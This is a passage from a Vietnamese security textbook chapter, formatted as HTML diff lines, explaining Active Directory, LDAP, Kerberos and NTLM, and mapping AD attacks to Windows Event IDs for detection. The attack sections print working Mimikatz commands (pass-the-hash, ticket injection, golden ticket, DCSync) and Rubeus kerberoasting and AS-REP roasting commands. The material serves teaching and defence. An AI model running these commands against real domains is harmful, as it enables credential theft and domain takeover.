+<p><strong>Lưu ý:</strong> ProcessGuid bền vững (không bị tái dùng như PID) → nối toàn bộ chuỗi event của một process. Event 8/10 với GrantedAccess <code>0x1410</code>/<code>0x1010</code> tới <code>lsass.exe</code> là chỉ báo credential dumping mạnh.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-37-active-directory-cau-truc-luan-ly-va-vat-ly">3.7. Active Directory — Cấu trúc luận lý và vật lý</h2>
+<h3 id="ch03-371-domain-tree-forest-ou">3.7.1. Domain, Tree, Forest, OU</h3>
+<table>
+<thead>
+<tr>
+<th>Khái niệm</th>
+<th>Định nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Domain</strong></td>
+<td>Ranh giới quản trị + bản sao CSDL (NTDS.dit). DC đồng bộ cùng namespace, ví dụ <code>corp.example.com</code></td>
+</tr>
+<tr>
+<td><strong>Tree</strong></td>
+<td>Tập domain chia sẻ namespace liên tục (<code>corp.example.com</code> ↔ <code>sales.corp.example.com</code>)</td>
+</tr>
+<tr>
+<td><strong>Forest</strong></td>
+<td>Ranh giới tin cậy cao nhất. Chia sẻ schema chung + Global Catalog + Enterprise Admins. <strong>Forest mới là ranh giới tin cậy thật sự</strong></td>
+</tr>
+<tr>
+<td><strong>OU (Organizational Unit)</strong></td>
+<td>Container để áp GPO và ủy quyền quản trị (delegation)</td>
+</tr>
+<tr>
+<td><strong>Site</strong></td>
+<td>Cấu trúc vật lý theo subnet IP — điều khiển replication và chọn DC gần nhất</td>
+</tr>
+</tbody>
+</table>
+<p>Cây phân cấp luận lý của AD: <strong>Forest</strong> bao toàn bộ và là ranh giới tin cậy cao nhất; bên trong là một hoặc nhiều <strong>Tree</strong> (cùng namespace liên tục), mỗi Tree chứa các <strong>Domain</strong>; trong Domain phân nhánh thành <strong>OU</strong> để áp GPO và ủy quyền, chứa các object lá (user/computer/group).</p>
+<pre><code>FOREST  (ranh giới tin cậy cao nhất — schema + Global Catalog + Enterprise Admins)
+└── TREE: example.com
+    ├── DOMAIN (root): corp.example.com          [NTDS.dit, các DC]
+    │   ├── OU=Servers
+    │   │   └── (computer objects)
+    │   ├── OU=Workstations
+    │   ├── OU=Users
+    │   │   ├── CN=jdoe        (user)
+    │   │   └── CN=svc_sql     (service account, có SPN)
+    │   └── OU=Groups
+    │       └── CN=Domain Admins
+    └── DOMAIN (child): sales.corp.example.com    [parent-child trust, 2 chiều, transitive]
+        └── OU=...
+</code></pre>
+<p>Lưu ý ranh giới tin cậy: OU <strong>không</strong> phải ranh giới tin cậy (chỉ là đơn vị áp chính sách/ủy quyền); Domain là ranh giới quản trị nhưng <strong>Forest mới là ranh giới tin cậy thật sự</strong> — chiếm một domain trong forest có thể bắc cầu sang domain khác qua trust nếu không bật SID filtering.</p>
+<h3 id="ch03-372-ntdsdit-va-phan-vung">3.7.2. NTDS.dit và phân vùng</h3>
+<p>CSDL AD nằm trong <code>C:\Windows\NTDS\ntds.dit</code> (định dạng ESE/JET Blue). Chia thành các <strong>naming context (partition)</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Partition</th>
+<th>DN</th>
+<th>Nội dung</th>
+<th>Phạm vi replicate</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Schema</td>
+<td><code>CN=Schema,CN=Configuration,DC=...</code></td>
+<td>Định nghĩa class/attribute</td>
+<td>Toàn forest</td>
+</tr>
+<tr>
+<td>Configuration</td>
+<td><code>CN=Configuration,DC=...</code></td>
+<td>Site, subnet, service</td>
+<td>Toàn forest</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><code>DC=corp,DC=example,DC=com</code></td>
+<td>User, group, computer</td>
+<td>Một domain</td>
+</tr>
+<tr>
+<td>Application (DNS)</td>
+<td><code>DC=DomainDnsZones,...</code></td>
+<td>DNS tích hợp AD</td>
+<td>Tùy cấu hình</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-373-schema">3.7.3. Schema</h3>
+<p>Schema định nghĩa <strong>classSchema</strong> (lớp object) và <strong>attributeSchema</strong> (thuộc tính). Mỗi attribute có:
+- <code>attributeID</code>: OID (ví dụ <code>1.2.840.113556.1.4.221</code> cho sAMAccountName).
+- <code>attributeSyntax</code> + <code>oMSyntax</code>: kiểu dữ liệu.
+- <code>isSingleValued</code>, <code>searchFlags</code> (bit 1 = indexed).</p>
+<blockquote>
+<p><strong>Vì sao:</strong> schema replicate toàn forest và khó sửa vì một thay đổi schema là vĩnh viễn (chỉ deactivate, không xóa hẳn) và ảnh hưởng mọi DC — nên forest là ranh giới schema.</p>
+</blockquote>
+<h3 id="ch03-374-gpo-group-policy-object">3.7.4. GPO — Group Policy Object</h3>
+<p>GPO gồm 2 phần:
+- <strong>GPC (Group Policy Container)</strong>: object trong AD (<code>CN=Policies,CN=System,DC=...</code>), chứa version + GUID + danh sách CSE.
+- <strong>GPT (Group Policy Template)</strong>: file trên SYSVOL <code>\\domain\SYSVOL\&lt;domain&gt;\Policies\{GUID}\</code> chứa <code>gpt.ini</code>, <code>Registry.pol</code>, scripts.</p>
+<p>Thứ tự áp dụng <strong>LSDOU</strong>: Local → Site → Domain → OU (OU sau ghi đè trước, trừ khi "Enforced"/"Block Inheritance").</p>
+<pre><code class="language-powershell"># Xem GPO áp lên user/máy hiện tại
+gpresult /h C:\report.html /f
+
+# Liệt kê GPO trong domain
+Get-GPO -All | Select DisplayName, Id, GpoStatus
+</code></pre>
+<blockquote>
+<p><strong>Lưu ý:</strong> SYSVOL đọc được bởi mọi Authenticated User. Lịch sử: GPP (<code>Groups.xml</code>) từng chứa mật khẩu mã hóa AES với <strong>key công khai</strong> (CVE-2014-1812) → ai cũng giải được. Săn file <code>cpassword</code> trong SYSVOL.</p>
+</blockquote>
+<h3 id="ch03-375-trust-quan-he-tin-cay">3.7.5. Trust — quan hệ tin cậy</h3>
+<table>
+<thead>
+<tr>
+<th>Loại</th>
+<th>Hướng</th>
+<th>Bắc cầu (transitive)</th>
+<th>Dùng khi</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parent-Child</td>
+<td>Hai chiều</td>
+<td>Có</td>
+<td>Trong cùng tree</td>
+</tr>
+<tr>
+<td>Tree-Root</td>
+<td>Hai chiều</td>
+<td>Có</td>
+<td>Giữa tree trong forest</td>
+</tr>
+<tr>
+<td>External</td>
+<td>Một/hai chiều</td>
+<td>Không</td>
+<td>Tới domain ngoài forest</td>
+</tr>
+<tr>
+<td>Forest</td>
+<td>Một/hai chiều</td>
+<td>Có (trong forest đối tác)</td>
+<td>Giữa 2 forest</td>
+</tr>
+<tr>
+<td>Realm</td>
+<td>Một/hai chiều</td>
+<td>Không</td>
+<td>Tới Kerberos realm phi-Windows</td>
+</tr>
+</tbody>
+</table>
+<p>Trust dùng <strong>trust key</strong> (inter-realm key) để DC bên này phát hành <strong>referral TGT</strong> cho bên kia. Tấn công liên quan: <strong>SID History</strong> + cross-domain golden ticket để leo quyền qua trust nếu không bật SID filtering.</p>
+<hr />
+<h2 id="ch03-38-ldap-giao-thuc-truy-van-ad">3.8. LDAP — giao thức truy vấn AD</h2>
+<h3 id="ch03-381-la-gi-va-co-che">3.8.1. Là gì và cơ chế</h3>
+<p>AD expose CSDL qua <strong>LDAP</strong> (RFC 4511) trên TCP <strong>389</strong> (cleartext/StartTLS), <strong>636</strong> (LDAPS), <strong>3268/3269</strong> (Global Catalog). LDAP dùng mã hóa <strong>BER/ASN.1</strong> cho message.</p>
+<p>Cấu trúc một <strong>LDAPMessage</strong> (ASN.1):</p>
+<pre><code>LDAPMessage ::= SEQUENCE {
+    messageID       INTEGER (0..maxInt),
+    protocolOp      CHOICE { bindRequest, searchRequest, searchResEntry, ... },
+    controls        [0] Controls OPTIONAL
+}
+</code></pre>
+<p>Một <strong>searchRequest</strong> chứa: <code>baseObject</code> (DN gốc), <code>scope</code> (baseObject=0 / singleLevel=1 / wholeSubtree=2), <code>derefAliases</code>, <code>sizeLimit</code>, <code>timeLimit</code>, <code>filter</code>, <code>attributes</code>.</p>
+<p>Bộ lọc (search filter) dạng RFC 4515:</p>
+<pre><code>(&amp;(objectClass=user)(sAMAccountName=jdoe))
+(&amp;(objectClass=user)(servicePrincipalName=*))     # tìm tài khoản có SPN -&gt; Kerberoast
+(userAccountControl:1.2.840.113556.1.4.803:=4194304)  # bit DONT_REQ_PREAUTH -&gt; AS-REP roast
+</code></pre>
+<p><code>1.2.840.113556.1.4.803</code> là <strong>matching rule OID LDAP_MATCHING_RULE_BIT_AND</strong> — lọc theo bit của <code>userAccountControl</code>.</p>
+<p><code>userAccountControl</code> (UAC) flags quan trọng:</p>
+<table>
+<thead>
+<tr>
+<th>Bit (hex)</th>
+<th>Tên</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x0002</td>
+<td>ACCOUNTDISABLE</td>
+<td>Tài khoản tắt</td>
+</tr>
+<tr>
+<td>0x0200</td>
+<td>NORMAL_ACCOUNT</td>
+<td>Tài khoản user thường</td>
+</tr>
+<tr>
+<td>0x10000</td>
+<td>DONT_EXPIRE_PASSWORD</td>
+<td>Mật khẩu không hết hạn</td>
+</tr>
+<tr>
+<td>0x400000 (4194304)</td>
+<td>DONT_REQ_PREAUTH</td>
+<td>Cho AS-REP roasting</td>
+</tr>
+<tr>
+<td>0x80000</td>
+<td>TRUSTED_FOR_DELEGATION</td>
+<td>Unconstrained delegation (nguy hiểm)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-382-vi-du-thuc-te">3.8.2. Ví dụ thực tế</h3>
+<pre><code class="language-powershell"># Tìm tài khoản có SPN (mục tiêu Kerberoasting) bằng PowerShell native
+([adsisearcher]&quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot;).FindAll() |
+  ForEach-Object { $_.Properties.samaccountname }
+</code></pre>
+<pre><code class="language-bash"># ldapsearch (Linux) — bind đơn giản rồi truy vấn
+ldapsearch -x -H ldap://10.0.0.10 -D &quot;CORP\jdoe&quot; -w 'Passw0rd!' \
+  -b &quot;DC=corp,DC=example,DC=com&quot; \
+  &quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot; sAMAccountName servicePrincipalName
+</code></pre>
+<blockquote>
+<p><strong>Lưu ý:</strong> LDAP 389 cleartext lộ bind credential (simple bind). Microsoft khuyến nghị <strong>LDAP signing + channel binding</strong> (LDAPS) để chống MITM/relay. Truy vấn LDAP bất thường (enum toàn bộ user/SPN) là dấu hiệu recon — phát hiện qua audit "Directory Service Access" (Event 4662) hoặc network monitoring.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-39-kerberos-xac-thuc-tung-buoc">3.9. Kerberos — xác thực từng bước</h2>
+<h3 id="ch03-391-la-gi-va-cac-thanh-phan">3.9.1. Là gì và các thành phần</h3>
+<p>Kerberos v5 (RFC 4120) là giao thức xác thực mặc định trong AD, dựa trên ticket và <strong>mã hóa đối xứng</strong>. Thành phần:</p>
+<ul>
+<li><strong>KDC (Key Distribution Center)</strong> = chạy trên DC, gồm <strong>AS (Authentication Service)</strong> và <strong>TGS (Ticket Granting Service)</strong>.</li>
+<li><strong>krbtgt</strong>: tài khoản đặc biệt; hash mật khẩu của nó là <strong>key ký TGT</strong>.</li>
+<li><strong>Principal</strong>: user (<code>user@REALM</code>) hoặc service (<code>HTTP/web01.corp.com</code>).</li>
+</ul>
+<p>Cổng: TCP/UDP <strong>88</strong>.</p>
+<h3 id="ch03-392-ba-giai-đoan-luong-đay-đu">3.9.2. Ba giai đoạn — luồng đầy đủ</h3>
+<pre><code>   CLIENT                         KDC (AS+TGS)                 SERVICE (web01)
+     |   (1) AS-REQ  -----------------&gt;|                            |
+     |   &lt;----------- (2) AS-REP  (TGT + session key)               |
+     |   (3) TGS-REQ (TGT + SPN) -----&gt;|                            |
+     |   &lt;----------- (4) TGS-REP (Service ticket + svc key)        |
+     |   (5) AP-REQ (Service ticket + Authenticator) --------------&gt;|
+     |   &lt;-------------------- (6) AP-REP (optional mutual auth)    |
+</code></pre>
+<p><strong>Giai đoạn 1 — AS-REQ (Authentication Service Request)</strong></p>
+<p>Client gửi tới AS. Trường chính trong <code>KDC-REQ-BODY</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cname</code></td>
+<td>Tên client (user)</td>
+</tr>
+<tr>
+<td><code>realm</code></td>
+<td>Realm (domain uppercase)</td>
+</tr>
+<tr>
+<td><code>sname</code></td>
+<td>Service name = <code>krbtgt/REALM</code></td>
+</tr>
+<tr>
+<td><code>till</code></td>
+<td>Thời hạn yêu cầu</td>
+</tr>
+<tr>
+<td><code>nonce</code></td>
+<td>Số ngẫu nhiên chống replay</td>
+</tr>
+<tr>
+<td><code>etype</code></td>
+<td>Danh sách encryption type ưa thích (AES256=18, AES128=17, RC4=23)</td>
+</tr>
+<tr>
+<td><code>padata</code></td>
+<td><strong>PA-ENC-TIMESTAMP</strong>: timestamp mã hóa bằng key dẫn xuất từ mật khẩu user (pre-authentication)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Pre-authentication</strong>: client chứng minh biết mật khẩu bằng cách mã hóa timestamp hiện tại. Nếu một tài khoản tắt pre-auth (UAC bit DONT_REQ_PREAUTH) → AS sẽ trả AS-REP mà không cần chứng minh → <strong>AS-REP roasting</strong>.</p>
+</blockquote>
+<p><strong>Giai đoạn 2 — AS-REP</strong></p>
+<p>AS trả về:
+- <strong>TGT (Ticket-Granting Ticket)</strong>: mã hóa bằng <strong>krbtgt key</strong> → client KHÔNG đọc được nội dung, chỉ cầm. Bên trong chứa session key, danh tính client, và <strong>PAC</strong>.
+- <strong>Phần enc-part</strong>: chứa <strong>TGS session key</strong>, mã hóa bằng key của user (client giải được).</p>
+<p>Cấu trúc một <strong>Ticket</strong> (KRB_TGT/service ticket, RFC 4120):</p>
+<pre><code>Ticket ::= [APPLICATION 1] SEQUENCE {
+   tkt-vno         [0] INTEGER (5),
+   realm           [1] Realm,
+   sname           [2] PrincipalName,    -- krbtgt/REALM hoặc SPN
+   enc-part        [3] EncryptedData     -- mã hóa bằng key của service/krbtgt
+}
+
+EncTicketPart (giải mã ra) ::= {
+   flags           -- forwardable, renewable, ...
+   key             -- session key
+   crealm, cname   -- danh tính client
+   authtime, starttime, endtime, renew-till
+   authorization-data -- chứa PAC (AD-WIN2K-PAC)
+}
+</code></pre>
+<p><strong>Giai đoạn 3 — TGS-REQ</strong></p>
+<p>Client muốn truy cập service <code>HTTP/web01</code>. Gửi tới TGS:
+- TGT (mà nó không đọc được) trong trường <code>padata</code> (AP-REQ wrapper).
+- <strong>Authenticator</strong>: timestamp + cname, mã hóa bằng <strong>TGS session key</strong> (lấy từ AS-REP) → chứng minh client sở hữu session key.
+- <code>sname</code> = <code>HTTP/web01.corp.com</code>.</p>
+<p><strong>Giai đoạn 4 — TGS-REP</strong></p>
+<p>TGS giải TGT bằng krbtgt key, lấy session key, kiểm authenticator, rồi cấp <strong>service ticket</strong> mã hóa bằng <strong>hash mật khẩu của tài khoản service</strong> (tài khoản sở hữu SPN). Kèm service session key (mã hóa bằng TGS session key).</p>
+<blockquote>
+<p><strong>Kerberoasting</strong> tấn công đây: bất kỳ user nào cũng xin được service ticket cho mọi SPN. Service ticket mã hóa bằng hash của service account → brute-force offline ra mật khẩu service account, nhất là khi etype=RC4 (0x17).</p>
+</blockquote>
+<p><strong>Giai đoạn 5 — AP-REQ</strong></p>
+<p>Client gửi service ticket + authenticator (mã bằng service session key) tới chính service. Service giải ticket bằng key của mình, lấy session key, kiểm authenticator → xác thực client. Service <strong>không cần liên hệ KDC</strong>.</p>
+<h3 id="ch03-393-pac-privilege-attribute-certificate">3.9.3. PAC — Privilege Attribute Certificate</h3>
+<p>PAC (MS-PAC) nhúng trong <code>authorization-data</code> của ticket, chứa thông tin ủy quyền:</p>
+<table>
+<thead>
+<tr>
+<th>Thành phần PAC</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>KERB_VALIDATION_INFO</code> (Logon Info)</td>
+<td>User SID, <strong>danh sách group SID</strong>, RID, logon time</td>
+</tr>
+<tr>
+<td><code>PAC_CLIENT_INFO</code></td>
+<td>Tên + thời gian</td>
+</tr>
+<tr>
+<td><code>UPN_DNS_INFO</code></td>
+<td>UPN</td>
+</tr>
+<tr>
+<td><code>Server Signature</code></td>
+<td>HMAC ký bằng key của service</td>
+</tr>
+<tr>
+<td><code>KDC Signature</code></td>
+<td>HMAC ký bằng krbtgt key</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>PAC là cách Windows mang <strong>thông tin nhóm/SID</strong> vào ticket để server quyết định quyền mà không cần truy vấn lại DC. Lỗ hổng <strong>MS14-068</strong> từng cho phép giả PAC (đặt mình vào Domain Admins) vì server signature kiểm tra yếu.</p>
+</blockquote>
+<h3 id="ch03-394-vi-du-thuc-te">3.9.4. Ví dụ thực tế</h3>
+<pre><code class="language-cmd">:: Liệt kê ticket Kerberos đang cache trong phiên
+klist
+
+:: Xóa ticket (buộc xin lại) — hữu ích khi debug
+klist purge
+</code></pre>
+<pre><code class="language-powershell"># Kerberoasting (Rubeus) — xin TGS cho mọi SPN, xuất hash để crack offline
+Rubeus.exe kerberoast /outfile:hashes.txt
+# Crack bằng hashcat mode 13100 (Kerberos 5 TGS-REP etype 23/RC4)
+# hashcat -m 13100 hashes.txt wordlist.txt
+</code></pre>
+<blockquote>
+<p><strong>Lưu ý:</strong> Kerberoasting để lại <strong>Event 4769</strong> với <code>TicketEncryptionType=0x17</code> (RC4) và <code>ServiceName</code> là tài khoản user-SPN. Nhiều 4769 RC4 trong thời gian ngắn từ một account = báo động.</p>
+</blockquote>
+<h3 id="ch03-395-luu-y-bao-mat-tong-hop-kerberos">3.9.5. Lưu ý bảo mật tổng hợp Kerberos</h3>
+<ul>
+<li>Vô hiệu hóa RC4, ép AES (etype 17/18) làm giảm hiệu quả Kerberoast.</li>
+<li>Service account dùng <strong>gMSA (Group Managed Service Account)</strong> với mật khẩu 120 ký tự tự động xoay → không crack được.</li>
+<li>Đặt <code>krbtgt</code> reset 2 lần định kỳ để vô hiệu golden ticket cũ.</li>
+</ul>
+<hr />
+<h2 id="ch03-310-ntlm-challengeresponse">3.10. NTLM — Challenge/Response</h2>
+<h3 id="ch03-3101-co-che-3-buoc">3.10.1. Cơ chế 3 bước</h3>
+<p>NTLM (NT LAN Manager) là giao thức cũ, dùng khi không có Kerberos (truy cập bằng IP, máy không join domain, workgroup). Ba message:</p>
+<pre><code>CLIENT                                   SERVER
+  | (1) NEGOTIATE_MESSAGE  -------------&gt;|   (báo khả năng: flags)
+  | &lt;----------- (2) CHALLENGE_MESSAGE   |   (server nonce 8 byte)
+  | (3) AUTHENTICATE_MESSAGE  ----------&gt;|   (NTLM response = HMAC dựa trên NT hash + challenge)
+</code></pre>
+<p><strong>Type 2 CHALLENGE_MESSAGE</strong> — các trường:</p>
+<table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Kích thước</th>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x00</td>
+<td>8 byte</td>
+<td>Signature</td>
+<td><code>NTLMSSP\0</code> (<code>4E 54 4C 4D 53 53 50 00</code>)</td>
+</tr>
+<tr>
+<td>0x08</td>
+<td>4 byte</td>
+<td>MessageType</td>
+<td><code>0x00000002</code></td>
+</tr>
+<tr>
+<td>0x0C</td>
+<td>8 byte</td>
+<td>TargetName fields</td>
+<td>len/maxlen/offset</td>
+</tr>
+<tr>
+<td>0x14</td>
+<td>4 byte</td>
+<td>NegotiateFlags</td>
+<td>Các cờ thương lượng</td>
+</tr>
+<tr>
+<td>0x18</td>
+<td>8 byte</td>
+<td><strong>ServerChallenge</strong></td>
+<td>Nonce ngẫu nhiên 8 byte</td>
+</tr>
+<tr>
+<td>0x20</td>
+<td>8 byte</td>
+<td>Reserved</td>
+<td>-</td>
+</tr>
+<tr>
+<td>0x28</td>
+<td>8 byte</td>
+<td>TargetInfo fields</td>
+<td>AV_PAIR (tên domain, máy...)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>NTLMv2 response</strong> (trong AUTHENTICATE): client tính
+<code>NTProofStr = HMAC-MD5(NTLMv2Hash, ServerChallenge || blob)</code>
+trong đó <code>NTLMv2Hash = HMAC-MD5(NT-Hash, uppercase(user) || domain)</code>. NT-Hash = <code>MD4(UTF-16LE(password))</code>.</p>
+<blockquote>
+<p><strong>Lưu ý:</strong> server không bao giờ thấy mật khẩu, chỉ thấy NT hash gián tiếp qua response. Nhưng nếu attacker có <strong>NT hash</strong>, họ tính được response mà không cần mật khẩu → đây chính là cơ sở của <strong>pass-the-hash</strong>.</p>
+</blockquote>
+<h3 id="ch03-3102-so-sanh-ntlm-vs-kerberos">3.10.2. So sánh NTLM vs Kerberos</h3>
+<table>
+<thead>
+<tr>
+<th>Tiêu chí</th>
+<th>NTLM</th>
+<th>Kerberos</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mô hình</td>
+<td>Challenge/response</td>
+<td>Ticket</td>
+</tr>
+<tr>
+<td>Mutual auth</td>
+<td>Không (mặc định)</td>
+<td>Có</td>
+</tr>
+<tr>
+<td>Bên thứ 3</td>
+<td>Không cần (server hỏi DC qua Netlogon)</td>
+<td>Cần KDC</td>
+</tr>
+<tr>
+<td>Dùng IP thay tên</td>
+<td>Được</td>
+<td>Không (cần SPN/DNS)</td>
+</tr>
+<tr>
+<td>Replay</td>
+<td>Yếu hơn</td>
+<td>Có timestamp + nonce</td>
+</tr>
+<tr>
+<td>Tấn công đặc trưng</td>
+<td>Pass-the-hash, NTLM relay</td>
+<td>Pass-the-ticket, Kerberoast, golden ticket</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Lưu ý:</strong> NTLM authentication tại DC sinh <strong>Event 4776</strong>. NTLM relay (gửi tiếp challenge/response sang máy khác) là tấn công lớn — phòng bằng SMB signing + EPA (Extended Protection for Authentication) + tắt NTLM nơi có thể.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-311-tan-cong-active-directory-va-dau-hieu-event-id">3.11. Tấn công Active Directory và dấu hiệu Event ID</h2>
+<p>(Bối cảnh tấn công đầy đủ: <a href="ch15.html">Chương 15</a>; kỹ thuật phát hiện và giám sát: <a href="ch10.html">Chương 10</a>.)</p>
+<h3 id="ch03-3111-pass-the-hash-pth">3.11.1. Pass-the-Hash (PtH)</h3>
+<p><strong>Cơ chế</strong>: dùng trực tiếp NT hash (không cần plaintext) để hoàn thành NTLM authentication tới dịch vụ từ xa (SMB, WMI).</p>
+<pre><code class="language-cmd">:: Mimikatz: tạo logon session mới mang NT hash
+sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
+</code></pre>
+<p><strong>Dấu hiệu</strong>: Event <strong>4624 Logon Type 9</strong> + <code>LogonProcessName=seclogo</code> + <code>AuthenticationPackageName=Negotiate</code>; thường theo sau là <strong>4624 Type 3</strong> ở máy đích kèm 4672 (privileges).</p>
+<h3 id="ch03-3112-pass-the-ticket-ptt">3.11.2. Pass-the-Ticket (PtT)</h3>
+<p><strong>Cơ chế</strong>: trích xuất TGT/service ticket từ bộ nhớ rồi inject vào phiên khác.</p>
+<pre><code class="language-cmd">:: Mimikatz: dump rồi nạp lại ticket
+sekurlsa::tickets /export
+kerberos::ptt [0;abc]-2-0-...-Administrator@krbtgt-CORP.kirbi
+</code></pre>
+<p><strong>Dấu hiệu</strong>: ticket Kerberos dùng từ máy/IP không khớp với 4768 ban đầu; thiếu 4768 tương ứng với hoạt động Kerberos.</p>
+<h3 id="ch03-3113-kerberoasting-as-rep-roasting">3.11.3. Kerberoasting / AS-REP Roasting</h3>
+<p>Đã mô tả cơ chế ở 3.9. Tóm tắt dấu hiệu:</p>
+<table>
+<thead>
+<tr>
+<th>Tấn công</th>
+<th>Event</th>
+<th>Trường chỉ báo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberoasting</td>
+<td>4769</td>
+<td><code>TicketEncryptionType=0x17</code>, ServiceName là user account có SPN</td>
+</tr>
+<tr>
+<td>AS-REP roasting</td>
+<td>4768</td>
+<td><code>PreAuthType=0</code>, account có UAC bit DONT_REQ_PREAUTH</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-powershell"># AS-REP roasting (Rubeus): tìm account không yêu cầu pre-auth
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+# hashcat -m 18200 asrep.txt wordlist.txt
+</code></pre>
+<h3 id="ch03-3114-golden-ticket-va-silver-ticket">3.11.4. Golden Ticket và Silver Ticket</h3>
+<table>
+<thead>
+<tr>
+<th>Tiêu chí</th>
+<th>Golden Ticket</th>
+<th>Silver Ticket</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Giả mạo</td>
+<td>TGT</td>
+<td>Service ticket</td>
+</tr>
+<tr>
+<td>Key cần có</td>
+<td><strong>krbtgt NT hash</strong></td>
+<td>NT hash của <strong>service account</strong></td>
+</tr>
+<tr>
+<td>Phạm vi</td>
+<td>Toàn domain (bất kỳ service)</td>
+<td>Một service cụ thể</td>
+</tr>
+<tr>
+<td>Liên hệ KDC</td>
+<td>Không (khi dùng)</td>
+<td>Không</td>
+</tr>
+<tr>
+<td>Phát hiện</td>
+<td>Khó (TGT hợp lệ); săn TGT lifetime bất thường, không có 4768 trước 4769</td>
+<td>Tương tự nhưng giới hạn 1 SPN</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-cmd">:: Golden ticket (Mimikatz) — cần krbtgt hash + domain SID
+kerberos::golden /user:Administrator /domain:corp.example.com ^
+  /sid:S-1-5-21-...-1107 /krbtgt:&lt;krbtgt_NTLM_hash&gt; /ptt
+</code></pre>
+<blockquote>
+<p><strong>Vì sao:</strong> golden ticket toàn năng vì TGT được ký bằng krbtgt key. Nếu attacker có krbtgt hash, họ tự phát hành TGT với PAC chứa SID Domain Admins, hạn dùng 10 năm. Chỉ reset krbtgt (2 lần) mới vô hiệu.</p>
+</blockquote>
+<h3 id="ch03-3115-dcsync">3.11.5. DCSync</h3>
+<p><strong>Cơ chế</strong>: giả làm DC, gọi RPC <strong>DRSUAPI</strong> <code>DRSGetNCChanges</code> (<code>IDL_DRSGetNCChanges</code>) để yêu cầu replicate dữ liệu bí mật (hash mọi tài khoản, kể cả krbtgt). Cần quyền <strong>Replicating Directory Changes</strong> (+ All) trên domain head.</p>
+<pre><code class="language-cmd">:: Mimikatz: kéo hash của krbtgt qua replication
+lsadump::dcsync /domain:corp.example.com /user:krbtgt
+</code></pre>
+<p><strong>Dấu hiệu</strong>: Event <strong>4662</strong> trên DC với <code>Properties</code> chứa GUID của control access right:
+- <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> (DS-Replication-Get-Changes)
+- <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code> (DS-Replication-Get-Changes-All)
+- <code>89e95b76-444d-4c62-991a-0facbeda640c</code> (DS-Replication-Get-Changes-In-Filtered-Set)</p>
+<p>Khi <code>AccessMask</code> chứa các GUID này từ một principal <strong>không phải DC</strong> = DCSync đang diễn ra.</p>
+<h3 id="ch03-3116-bang-tong-hop-dau-hieu">3.11.6. Bảng tổng hợp dấu hiệu</h3>
+<table>
+<thead>
+<tr>
+<th>Tấn công</th>
+<th>Event ID chính</th>
+<th>Chỉ báo cốt lõi</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Pass-the-Hash</td>
+<td>4624 (Type 9), 4776</td>
+<td>LogonProcessName seclogo</td>
+</tr>
+<tr>
+<td>Pass-the-Ticket</td>
+<td>4624/4769 không khớp 4768</td>
+<td>Ticket dùng từ host lạ</td>
+</tr>
+<tr>
+<td>Kerberoasting</td>
+<td>4769</td>
+<td>EncType 0x17, SPN user account</td>
+</tr>
+<tr>
+<td>AS-REP Roasting</td>
+<td>4768</td>
+<td>PreAuthType 0</td>
+</tr>
+<tr>
+<td>Golden Ticket</td>
+<td>4769 không có 4768 trước</td>
+<td>TGT lifetime bất thường</td>
+</tr>
+<tr>
+<td>DCSync</td>
+<td>4662</td>
+<td>Replication GUID từ non-DC</td>
+</tr>
+<tr>
+<td>Service install (PsExec)</td>
+<td>7045, 4697</td>
+<td>binPath lạ</td>
+</tr>
+<tr>
+<td>Log clear</td>
+<td>1102, 104</td>
+<td>SubjectUserName</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="ch03-312-powershell-logging">3.12. PowerShell Logging</h2>
+<h3 id="ch03-3121-ba-cap-logging">3.12.1. Ba cấp logging</h3>
+<table>
+<thead>
+<tr>
+<th>Cấp</th>
+<th>Event ID / Log</th>
+<th>Ghi gì</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Module Logging</strong></td>
+<td>4103 (Microsoft-Windows-PowerShell/Operational)</td>
+<td>Pipeline + tham số lệnh theo module</td>
+</tr>
+<tr>
+<td><strong>Script Block Logging</strong></td>
+<td><strong>4104</strong> (cùng log)</td>
+<td>Toàn bộ nội dung script block đã <strong>de-obfuscate</strong> trước khi chạy</td>
+</tr>
+<tr>
+<td><strong>Transcription</strong></td>
+<td>File text</td>
+<td>Toàn bộ input/output ra file</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-3122-bat-bang-gpo-registry">3.12.2. Bật bằng GPO / Registry</h3>
+<pre><code class="language-cmd">:: Script Block Logging (mạnh nhất — ghi cả lệnh đã giải mã base64)
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot; ^
